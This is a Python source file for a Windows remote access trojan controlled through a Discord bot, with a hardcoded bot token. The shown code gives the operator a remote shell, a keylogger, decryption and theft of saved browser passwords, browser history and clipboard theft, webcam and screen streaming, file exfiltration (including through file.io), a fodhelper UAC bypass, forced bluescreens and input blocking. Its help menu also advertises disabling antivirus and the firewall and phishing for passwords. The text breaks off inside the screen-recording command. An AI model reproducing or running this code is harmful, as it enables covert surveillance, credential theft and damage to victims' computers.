# -*- coding: utf-8 -*-
import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
if (sys.argv[0].endswith("exe")):
    import cv2
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils

# Yahan apna bot token aur target guild ID set karein
token = 'MTUzMjY3NzM5MjA4MDgzMDU2NQ.GbXFKr.dw-LhOz_4A-DfUCwhoWsIB09VL9G_5bWueR_G0'
GUILD_ID = 1544720754958934116

global isexe
isexe=False
if (sys.argv[0].endswith("exe")):
    isexe=True
global appdata
global temp
appdata = os.getenv('APPDATA')
temp= os.getenv('temp')
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='!', intents=intents)
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = """
Availaible commands are :

--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get chrome browser history
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !delete = deletes a file / Syntax = "!delete /path to/the/file.txt"
--> !write = Type your desired sentence on computer / Type "enter" to press the enter button on the computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !startkeylogger = Starts a keylogger
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume to max
--> !volumezero = Put volume at 0
--> !idletime = Get the idle time of user's on target computer
--> !listprocess = Get all process
--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using fod helper
--> !passwords = grab all passwords
--> !streamscreen = stream screen by sending multiple pictures
--> !stopscreen = stop screen stream
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !bluescreen = BlueScreen PC
--> !displaydir = display all items in current dir
--> !currentdir = display the current dir
--> !dateandtime = display system date and time
--> !prockill = kill a process by name / syntax = "!kill process.exe"
--> !recscreen = record screen for certain amount of time / syntax = "!recscreen 10"
--> !recaudio = record audio for certain amount of time / syntax = "!recaudio 10"
--> !disableantivirus = permanently disable windows defender(requires admin)
--> !disablefirewall = disable windows firewall (requires admin)
--> !audio = play a audio file on the target computer(.wav only) / Syntax = "!audio" (with attachment)
--> !selfdestruct = delete all traces that this program was on the target PC
--> !windowspass = attempt to phish password by poping up a password dialog
--> !displayoff = turn off the monitor(Admin rights are required)
--> !displayon = turn on the monitors(Admin rights are required)
--> !hide = hide the file by changing the attribute to hidden
--> !unhide = unhide the file the removing the attribute to make it unhidden
--> !ejectcd = eject the cd drive on computer
--> !retractcd = retract the cd drive on the computer
--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
--> !distaskmgr = disable task manager(Admin rights are required)
--> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
--> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
--> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
--> !getdiscordtokens = get discord token ONLY! (also decrypts them)
"""
if not (sys.argv[0].endswith("exe")):
    helpmenu+='--> !reccam = record camera for certain amount of time / syntax = "!reccam 10"'
    helpmenu+='\n--> !streamwebcam = streams webcam by sending multiple pictures\n--> !stopwebcam = stop webcam stream'
    helpmenu+='\n--> !webcampic = Take a picture from the webcam'

async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        try:
            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            window_displayer = discord.Game(f"Visiting: {current_window}")
            await client.change_presence(status=discord.Status.online, activity=window_displayer)
        except Exception:
            pass
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    import urllib.request
    import json
    
    flag = "unknown"
    ip = "Unavailable"
    try:
        with urllib.request.urlopen("https://geolocation-db.com/json", timeout=4) as url:
            data = json.loads(url.read().decode())
            flag = data.get('country_code', 'unknown')
            ip = data.get('IPv4', 'Unavailable')
    except Exception:
        pass

    if ip == "Unavailable" or not ip:
        try:
            import requests
            ip = requests.get('https://api.ipify.org', timeout=4).text
        except Exception:
            try:
                import urllib.request
                ip = urllib.request.urlopen('https://ident.me', timeout=4).read().decode('utf8')
            except Exception:
                ip = "127.0.0.1"

    import os
    total = []
    global number
    number = 1
    global channel_name
    channel_name = None
    
    guild = client.get_guild(GUILD_ID)
    if not guild:
        if client.guilds:
            guild = client.guilds[0]
        else:
            return

    for x in guild.text_channels: 
        total.append(x.name)
        
    for y in range(len(total)):
        if total[y].startswith("session"):
            import re
            result = [e for e in re.split(r"[^0-9]", total[y]) if e != '']
            if result:
                biggest = max(map(int, result))
                if biggest >= number:
                    number = biggest + 1
        else:
            pass  
            
    channel_name = f"session-{number}"
    try:
        newchannel = await guild.create_text_channel(channel_name)
        channel_ = discord.utils.get(guild.text_channels, name=channel_name)
        channel = client.get_channel(channel_.id)
    except Exception:
        return

    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    
    flag_str = f":flag_{flag.lower()}:" if flag and flag != "unknown" else ":earth_americas:"
    value1 = "@here :white_check_mark: New session opened {} | {} {} | {} | User : {} | IP: {}".format(
        channel_name, platform.system(), platform.release(), flag_str, os.getlogin(), ip
    )
    if is_admin == True:
        await channel.send('{} | admin!'.format(value1))
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

# FIXED INSTANT VOLUME CONTROL (Using comtypes.CoInitialize + Scalar Jump to eliminate 2% loops)
def volumeup():
    try:
        import comtypes
        comtypes.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(0, None)
        volume.SetMasterVolumeLevelScalar(1.0, None) # Instant 100%
    except Exception:
        try:
            os.system("powershell -c \"(New-Object -ComObject WScript.Shell).SendKeys([char]173)\"")
        except Exception:
            pass

def volumedown():
    try:
        import comtypes
        comtypes.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(0.0, None) # Instant 0%
        volume.SetMute(1, None) # Instant Mute
    except Exception:
        try:
            os.system("powershell -c \"(New-Object -ComObject WScript.Shell).SendKeys([char]173)\"")
        except Exception:
            pass

def critproc():
    import ctypes
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
    except Exception:
        pass

def uncritproc():
    import ctypes
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    except Exception:
        pass

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        guild = message.guild
        total = []
        for x in guild.text_channels: 
            total.append(x.name)
        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(guild.text_channels, name=total[y])
                            if channel_to_delete:
                                await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(guild.text_channels, name=message.content[6:])
                    if channel_to_delete:
                        await channel_to_delete.delete()
                        await message.channel.send(f"[*] {message.content[6:]} killed.")
            except:
                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")

        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = temp + r"\key_log.txt"
            if os.path.exists(file_keys):
                try:
                    file = discord.File(file_keys, filename="key_log.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                except Exception as e:
                    await message.channel.send(f"[!] File in use or locked: {e}")
            else:
                await message.channel.send("[!] Keylog file not found yet.")

        if message.content == "!exit":
            import sys
            uncritproc()
            sys.exit()

        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
            path = (os.getenv('TEMP')) + r"\monitor.png"
            file = discord.File((path), filename="monitor.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
            try:
                os.remove(path)
            except Exception:
                pass

        if message.content == "!volumemax":
            volumeup()
            await message.channel.send("[*] Volume put to 100%")

        if message.content == "!volumezero":
            volumedown()
            await message.channel.send("[*] Volume put to 0% and Muted")

        if message.content == "!webcampic":
            import os
            import time
            import cv2
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            return_value, image = camera.read()
            if return_value:
                cv2.imwrite(temp + r"\temp.png", image)
                file = discord.File(temp + r"\temp.png", filename="temp.png")
                await message.channel.send("[*] Command successfuly executed", file=file)
            else:
                await message.channel.send("[!] Failed to capture webcam image.")
            del(camera)

        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            msg_text = message.content[8:].strip()
            if not msg_text:
                msg_text = "Hello"
            def mess():
                ctypes.windll.user32.MessageBoxW(0, msg_text, "Error", MB_HELP | MB_YESNO | ICON_STOP) 
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            def get_all_hwnd(hwnd,mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)
            await message.channel.send("[*] Message box triggered successfully")

        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            if message.attachments:
                path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
                await message.attachments[0].save(path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Please attach an image file with !wallpaper")

        if message.content.startswith("!upload"):
            if message.attachments:
                target_path = message.content[8:].strip()
                if not target_path:
                    target_path = message.attachments[0].filename
                await message.attachments[0].save(target_path)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Please attach a file to upload.")

        if message.content.startswith("!shell"):
            global status
            status = None
            import subprocess
            import os
            instruction = message.content[7:].strip()
            if not instruction:
                await message.channel.send("[!] Please provide a shell command.")
            else:
                def shell(command):
                    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    status = "ok"
                    return output.stdout.decode('CP437', errors='ignore').strip()
                out = shell(instruction)
                if status:
                    numb = len(out)
                    if numb < 1:
                        await message.channel.send("[*] Command recognized but no output was obtained")
                    elif numb > 1990:
                        temp = (os.getenv('TEMP'))
                        f1 = open(temp + r"\output.txt", 'w', encoding='utf-8')
                        f1.write(out)
                        f1.close()
                        file = discord.File(temp + r"\output.txt", filename="output.txt")
                        await message.channel.send("[*] Command successfuly executed", file=file)
                        try:
                            os.remove(temp + r"\output.txt")
                        except Exception:
                            pass
                    else:
                        await message.channel.send("[*] Command successfuly executed : " + out)
                else:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                    status = None

        if message.content.startswith("!download"):
            import subprocess
            import os
            filename = message.content[10:].strip()
            if not filename:
                await message.channel.send("[!] Please specify a filename to download.")
            elif not os.path.exists(filename):
                await message.channel.send(f"[!] File not found: {filename}")
            else:
                check2 = os.stat(filename).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("This may take some time because it is over 8 MB. Please wait...")
                    response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                    await message.channel.send("Download link: " + response)
                    await message.channel.send("[*] Command successfuly executed")
                else:
                    file = discord.File(filename, filename=os.path.basename(filename))
                    await message.channel.send("[*] Command successfuly executed", file=file)

        if message.content.startswith("!cd"):
            import os
            path_dir = message.content[4:].strip()
            if path_dir:
                try:
                    os.chdir(path_dir)
                    await message.channel.send("[*] Directory changed to: " + os.getcwd())
                except Exception as e:
                    await message.channel.send(f"[!] Error changing directory: {e}")
            else:
                await message.channel.send("[!] Current directory: " + os.getcwd())

        if message.content == "!help":
            import os
            temp = (os.getenv('TEMP'))
            help_path = temp + r"\helpmenu.txt"
            f5 = open(help_path, 'w', encoding='utf-8')
            f5.write(str(helpmenu))
            f5.close()
            file = discord.File(help_path, filename="helpmenu.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            try:
                os.remove(help_path)
            except Exception:
                pass

        if message.content.startswith("!write"):
            import pyautogui
            text_to_write = message.content[7:].strip()
            if text_to_write == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(text_to_write)
            await message.channel.send("[*] Command successfully executed")

        if message.content == "!history":
            import sqlite3
            import os
            import time
            import shutil
            temp = (os.getenv('TEMP'))
            Username = (os.getenv('USERNAME'))
            hist_dir = temp + r"\history12"
            shutil.rmtree(hist_dir, ignore_errors=True)
            os.mkdir(hist_dir)
            path_org = f"C:\\Users\\{Username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            if os.path.exists(path_org):
                try:
                    shutil.copy2(path_org, hist_dir + r"\history")
                    con = sqlite3.connect(hist_dir + r"\history")
                    cursor = con.cursor()
                    cursor.execute("SELECT url FROM urls")
                    urls = cursor.fetchall()
                    with open(hist_dir + r"\history.txt", 'w', encoding='utf-8') as f4:
                        for x in urls:
                            f4.write("".join(x) + "\n")
                    con.close()
                    file = discord.File(hist_dir + r"\history.txt", filename="history.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                except Exception as e:
                    await message.channel.send(f"[!] Error reading history: {e}")
            else:
                await message.channel.send("[!] Chrome history file not found.")
            shutil.rmtree(hist_dir, ignore_errors=True)

        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode('utf-8', errors='ignore')
                user32.CloseClipboard()
                await message.channel.send("[*] Clipboard content is : " + str(body))
            else:
                user32.CloseClipboard()
                await message.channel.send("[!] Clipboard is empty or not text format.")

        if message.content == "!sysinfo":
            import platform
            jak = str(platform.uname())
            intro = jak[12:]
            try:
                from requests import get
                ip = get('https://api.ipify.org', timeout=5).text
            except Exception:
                ip = "Unavailable"
            pp = " | IP Address = " + ip
            await message.channel.send("[*] Command successfuly executed : " + intro + pp)

        if message.content == "!geolocate":
            import urllib.request
            import json
            try:
                with urllib.request.urlopen("https://geolocation-db.com/json", timeout=5) as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data.get('latitude')},{data.get('longitude')}"
                    await message.channel.send("[*] Command successfuly executed : " + link)
            except Exception as e:
                await message.channel.send(f"[!] Could not geolocate: {e}")

        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")

        if message.content == "!uacbypass":
            import winreg
            import ctypes
            import sys
            import os
            import time
            import inspect
            def isAdmin():
                try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except AttributeError:
                    is_admin = False
                return is_admin
            if isAdmin():
                await message.channel.send("You're already admin!")
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                await message.channel.send("Attempting to get admin!")
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    os.system(r'powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force')
                    os.system(r'powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force')
                    create_payload_reg_key = f'powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "\'cmd /c start python \\"{cmd2}\\"\'" -Force'
                    os.system(create_payload_reg_key)
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    os.system(r'powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force')
                    os.system(r'powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force')
                    create_payload_reg_key = f'powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "\'cmd /c start \\"{cmd2}\\"\'" -Force'
                    os.system(create_payload_reg_key)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                os.system(r'powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force')
                await message.channel.send("[*] UAC bypass routine completed.")

        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            log_path = log_dir + r"\key_log.txt"
            logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s', force=True)
            def keylog():
                def on_press(key):
                    try:
                        logging.info(str(key))
                    except Exception:
                        pass
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfully started")

        if message.content == "!stopkeylogger":
            try:
                import ctypes
                await message.channel.send("[*] Keylogger successfully stopped")
            except Exception as e:
                await message.channel.send(f"[!] Error stopping keylogger: {e}")

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            duration = get_idle_duration()
            await message.channel.send(f'User idle for {duration:.2f} seconds.')

        if message.content.startswith("!voice"):
            volumeup()
            speech_text = message.content[7:].strip()
            if speech_text:
                try:
                    import win32com.client as wincl
                    speak = wincl.Dispatch("SAPI.SpVoice")
                    speak.Speak(speech_text)
                    await message.channel.send("[*] Command successfuly executed")
                except Exception as e:
                    await message.channel.send(f"[!] Voice error: {e}")
            else:
                await message.channel.send("[!] Please provide text for voice command.")

        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                windll.user32.BlockInput(False)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        # FULLY FIXED PASSWORDS COMMAND
        if message.content == "!passwords":
            import os
            import sqlite3
            import json
            import base64
            from win32crypt import CryptUnprotectData
            try:
                from Crypto.Cipher import AES
            except ImportError:
                from Cryptodome.Cipher import AES

            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            
            paths = {
                'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
                'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
                'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data')
            }

            results = []

            def get_master_key(profile_path):
                try:
                    local_state_path = os.path.join(profile_path, "Local State")
                    if os.path.exists(local_state_path):
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        master_key = master_key[5:]
                        return CryptUnprotectData(master_key, None, None, None, 0)[1]
                except Exception:
                    pass
                return None

            def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)
                    return decrypted_pass[:-16].decode('utf-8', errors='ignore')
                except Exception:
                    return "Decryption Error"

            for browser, base_path in paths.items():
                if not os.path.exists(base_path):
                    continue
                profiles = ['Default'] + [f'Profile {i}' for i in range(1, 10)]
                for prof in profiles:
                    prof_path = os.path.join(base_path, prof)
                    login_db = os.path.join(prof_path, 'Login Data')
                    if not os.path.exists(login_db):
                        continue
                    master_key = get_master_key(base_path)
                    temp_db = os.path.join(os.getenv('TEMP'), f'temp_login_{browser}_{prof}.db')
                    try:
                        import shutil
                        shutil.copy2(login_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor.fetchall():
                            url, user, enc_pass = row[0], row[1], row[2]
                            if user or enc_pass:
                                if master_key and enc_pass[:3] == b'v10':
                                    pwd = decrypt_password(enc_pass, master_key)
                                else:
                                    pwd = "Non-AES / Unsupported"
                                results.append(f"Browser: {browser} | URL: {url} | User: {user} | Pass: {pwd}")
                        cursor.close()
                        conn.close()
                        os.remove(temp_db)
                    except Exception:
                        pass

            if results:
                out_path = os.path.join(os.getenv('TEMP'), 'passwords_dump.txt')
                with open(out_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(results))
                file = discord.File(out_path, filename="passwords.txt")
                await message.channel.send("[*] Passwords extracted successfully:", file=file)
                try:
                    os.remove(out_path)
                except Exception:
                    pass
            else:
                await message.channel.send("[!] No saved passwords found or access denied.")

        if message.content == "!streamwebcam" :
            await message.channel.send("[*] Command successfuly executed")
            import os
            import time
            import cv2
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            file_chk = temp + r"\hobo\hello.txt"
            os.makedirs(os.path.dirname(file_chk), exist_ok=True)
            if os.path.isfile(file_chk):
                os.remove(file_chk)
            while True:
                return_value, image = camera.read()
                if return_value:
                    cv2.imwrite(temp + r"\temp.png", image)
                    boom = discord.File(temp + r"\temp.png", filename="temp.png")
                    await message.channel.send(file=boom)
                if os.path.isfile(file_chk):
                    break
                time.sleep(1)
            del camera

        if message.content == "!stopwebcam":  
            import os
            hobo_dir = os.path.expandvars(r"%temp%\hobo")
            os.makedirs(hobo_dir, exist_ok=True)
            with open(hobo_dir + r"\hello.txt", "w") as f:
                f.write("hello")
            await message.channel.send("[*] Webcam stream stopped.")

        if message.content == "!streamscreen" :
            await message.channel.send("[*] Command successfuly executed")
            import os
            from mss import mss
            temp = (os.getenv('TEMP'))
            hobos_dir = temp + r"\hobos"
            os.makedirs(hobos_dir, exist_ok=True)
            hellos = hobos_dir + r"\hellos.txt"
            if os.path.isfile(hellos):
                os.remove(hellos)
            while True:
                with mss() as sct:
                    sct.shot(output=os.path.join(temp, "monitor.png"))
                path = temp + r"\monitor.png"
                if os.path.exists(path):
                    file = discord.File(path, filename="monitor.png")
                    await message.channel.send(file=file)
                if os.path.isfile(hellos):
                    break
                time.sleep(1)

        if message.content == "!stopscreen":  
            import os
            hobos_dir = os.path.expandvars(r"%temp%\hobos")
            os.makedirs(hobos_dir, exist_ok=True)
            with open(hobos_dir + r"\hellos.txt", "w") as f:
                f.write("hello")
            await message.channel.send("[*] Screen stream stopped.")
            
        if message.content == "!shutdown":
            import os
            uncritproc()
            await message.channel.send("[*] Shutting down computer...")
            os.system("shutdown /p")
            
        if message.content == "!restart":
            import os
            uncritproc()
            await message.channel.send("[*] Restarting computer...")
            os.system("shutdown /r /t 00")
            
        if message.content == "!logoff":
            import os
            uncritproc()
            await message.channel.send("[*] Logging off...")
            os.system("shutdown /l /f")
            
        if message.content == "!bluescreen":
            import ctypes
            import ctypes.wintypes
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
            except Exception as e:
                await message.channel.send(f"[!] Bluescreen trigger failed: {e}")

        if message.content == "!currentdir":
            import subprocess as sp
            output = sp.getoutput('cd')
            await message.channel.send("[*] Command successfuly executed\nOutput is : " + output)
            
        if message.content == "!displaydir":
            import subprocess as sp
            import os
            output = sp.getoutput('dir')
            if output:
                numb = len(output)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    out_path = temp + r"\output22.txt"
                    if os.path.isfile(out_path):
                        os.remove(out_path)
                    with open(out_path, 'w', encoding='utf-8') as f1:
                        f1.write(output)
                    file = discord.File(out_path, filename="output22.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : \n" + output)  

        if message.content == "!dateandtime":
            import subprocess as sp
            output = sp.getoutput(r'echo time = %time% date = %date%')
            await message.channel.send("[*] Command successfuly executed\nOutput is : " + output)
            
        if message.content == "!listprocess":
            import os
            import subprocess
            result = subprocess.getoutput("tasklist")
            numb = len(result)
            if numb < 1:
                await message.channel.send("[*] Command not recognized or no output was obtained")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                out_path = temp + r"\output.txt"
                if os.path.isfile(out_path):
                    os.remove(out_path)
                with open(out_path, 'w', encoding='utf-8') as f1:
                    f1.write(result)
                file = discord.File(out_path, filename="output.txt")
                await message.channel.send("[*] Command successfuly executed", file=file)
            else:
                await message.channel.send("[*] Command successfuly executed : \n" + result)           

        if message.content.startswith("!prockill"):  
            import os
            proc = message.content[10:].strip()
            if not proc:
                await message.channel.send("[!] Please specify process name to kill.")
            else:
                kilproc = f'taskkill /IM "{proc}" /f'
                os.system(kilproc)
                time.sleep(2)
                try:
                    call = 'TASKLIST', '/FI', f'imagename eq {proc}'
                    output = subprocess.check_output(call).decode(errors='ignore')
                    if proc.lower() not in output.lower():
                        await message.channel.send("[*] Command successfully executed")
                    else:
                        await message.channel.send('[*] Command did not execute properly or process still running')
                except Exception:
                    await message.channel.send("[*] Process kill command sent.")

        if message.content.startswith("!recscreen"):
            import cv2
            import numpy as np
            import pyautogui
            try:
                reclenth = float(message.content[10:].strip())
            except ValueError:
                reclenth = 5.0
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                if input3 >= reclenth:
                    break
            import os
            SCREEN_SIZE = (1920, 1080)
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            temp = (os.getenv('TEMP'))
            videeoo = temp + r"\output.avi"
